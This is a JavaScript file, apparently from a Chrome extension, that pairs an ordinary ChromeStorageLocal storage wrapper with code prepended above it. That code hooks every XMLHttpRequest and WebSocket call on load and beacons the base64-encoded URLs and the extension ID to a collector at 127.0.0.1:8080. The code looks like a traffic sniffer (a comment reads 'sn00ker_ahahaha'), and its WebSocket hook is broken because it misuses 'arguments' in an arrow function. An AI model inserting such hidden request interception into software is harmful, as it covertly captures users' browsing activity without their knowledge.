function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
'use strict';
var ChromeStorageLocal = (function () {
    function ChromeStorageLocal(storage, key) {
        this.store = storage;
        this.key = key;
    }
    ChromeStorageLocal.prototype.set = function (state) {
        var _this = this;
        return new Promise(function (resolve, reject) {
            var item = {};
            item[_this.key] = state;
            _this.store.set(item, function () {
                var err = chrome.runtime.lastError;
                if (err) {
                    reject(err);
                }
                else {
                    resolve(state);
                }
            });
        });
    };
    ChromeStorageLocal.prototype.get = function () {
        var _this = this;
        return new Promise(function (resolve, reject) {
            _this.store.get(_this.key, function (result) {
                var err = chrome.runtime.lastError;
                if (err) {
                    reject(err);
                }
                else {
                    var state = void 0;
                    if (result && Object.keys(result).length) {
                        state = result[_this.key];
                    }
                    resolve(state);
                }
            });
        });
    };
    ChromeStorageLocal.prototype.update = function (newState) {
        var _this = this;
        return new Promise(function (resolve, reject) {
            _this.get().then(function (state) {
                _this.set(Util.mergeObjects(state, newState)).then(resolve).catch(reject);
            }).catch(reject);
        });
    };
    return ChromeStorageLocal;
}());
